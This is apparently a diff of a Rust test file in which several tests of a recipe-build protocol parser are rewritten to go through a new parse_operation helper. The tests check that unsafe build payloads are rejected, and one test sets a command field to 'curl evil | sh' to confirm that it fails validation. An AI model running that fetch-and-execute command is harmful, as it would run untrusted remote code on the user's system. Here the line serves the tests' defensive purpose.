@@ -4,20 +4,26 @@ use serde_json::json;
 use uuid::Uuid;
 use vonk_agent_protocol::{AgentClaim, RecipeOperationRequest, canonical_json, hex_sha256};
 
-fn claim(operation: &str, payload: serde_json::Value) -> AgentClaim {
-    AgentClaim {
+fn parse_operation(
+    operation: &str,
+    payload: serde_json::Value,
+) -> Result<RecipeOperationRequest, vonk_agent_protocol::ProtocolError> {
+    let payload: vonk_agent_protocol::generated::AgentClaimPayload =
+        serde_json::from_value(payload)?;
+    let claim = AgentClaim {
         attempt: 1,
         authority_revision: "c".repeat(64),
         deadline: DateTime::parse_from_rfc3339("2026-08-07T12:05:00+00:00").unwrap(),
         fence: Uuid::parse_str("00000000-0000-4000-8000-000000000003").unwrap(),
         job_id: Uuid::parse_str("00000000-0000-4000-8000-000000000004").unwrap(),
         node_id: format!("spk_{}", "0".repeat(32)),
-        operation: operation.to_owned(),
+        operation: operation.parse().unwrap(),
         operation_id: Uuid::parse_str("00000000-0000-4000-8000-000000000005").unwrap(),
         payload_digest: hex_sha256(&canonical_json(&payload).unwrap()),
         payload,
         schema_version: 1,
-    }
+    };
+    RecipeOperationRequest::parse(&claim)
 }
 
 fn build_payload() -> serde_json::Value {
@@ -140,7 +146,7 @@ fn build_claim_matches_shared_python_rust_vectors() {
             apply_change(&mut payload, change);
         }
         assert_eq!(
-            RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_ok(),
+            parse_operation("recipe.build.v1", payload).is_ok(),
             case.valid,
             "shared vector disagreed: {}",
             case.name
@@ -151,17 +157,17 @@ fn build_claim_matches_shared_python_rust_vectors() {
 #[test]
 fn build_payload_is_closed_and_declarative() {
     assert!(matches!(
-        RecipeOperationRequest::parse(&claim("recipe.build.v1", build_payload())).unwrap(),
+        parse_operation("recipe.build.v1", build_payload()).unwrap(),
         RecipeOperationRequest::Build(_)
     ));
 
     let mut unsafe_payload = build_payload();
     unsafe_payload["limits"]["privileged"] = json!(true);
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", unsafe_payload)).is_err());
+    assert!(parse_operation("recipe.build.v1", unsafe_payload).is_err());
 
     let mut command = build_payload();
     command["command"] = json!("curl evil | sh");
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", command)).is_err());
+    assert!(parse_operation("recipe.build.v1", command).is_err());
 }
 
 #[test]
@@ -170,7 +176,7 @@ fn build_payload_rejects_every_sys_capability() {
         let mut payload = build_payload();
         payload["capabilities"] = json!([capability]);
         assert!(
-            RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err(),
+            parse_operation("recipe.build.v1", payload).is_err(),
             "{capability} must never cross the recipe build contract"
         );
     }
@@ -180,22 +186,22 @@ fn build_payload_rejects_every_sys_capability() {
 fn build_network_requires_a_consistent_mode_and_host_declaration() {
     let mut payload = build_payload();
     payload["network"] = json!({"mode": "none", "hosts": ["pypi.org"]});
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
+    assert!(parse_operation("recipe.build.v1", payload).is_err());
 
     let mut payload = build_payload();
     payload["network"] = json!({"mode": "public", "hosts": []});
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
+    assert!(parse_operation("recipe.build.v1", payload).is_err());
 }
 
 #[test]
 fn build_base_images_are_exact_declared_supply_chain_authority() {
     let mut payload = build_payload();
     payload["base_images"][0]["manifest_digest"] = json!(format!("sha256:{}", "e".repeat(64)));
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
+    assert!(parse_operation("recipe.build.v1", payload).is_err());
 
     let mut payload = build_payload();
     payload["base_images"][0]["reference"] = json!("ghcr.io/vonkforge/base:latest");
-    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
+    assert!(parse_operation("recipe.build.v1", payload).is_err());
 }
 
 #[test]
@@ -210,7 +216,7 @@ fn build_network_rejects_private_and_metadata_destinations() {
         let mut payload = build_payload();
         payload["network"] = json!({"mode": "public", "hosts": [host]});
         assert!(
-            RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err(),
+            parse_operation("recipe.build.v1", payload).is_err(),
             "private or metadata host was accepted: {host}"
         );
     }
@@ -230,7 +236,7 @@ fn image_import_binds_one_exact_build_and_layout() {
         "image_bytes": 1024
     });
     assert!(matches!(
-        RecipeOperationRequest::parse(&claim("recipe.image.import.v1", payload)).unwrap(),
+        parse_operation("recipe.image.import.v1", payload).unwrap(),
         RecipeOperationRequest::ImageImport(_)
     ));
 }
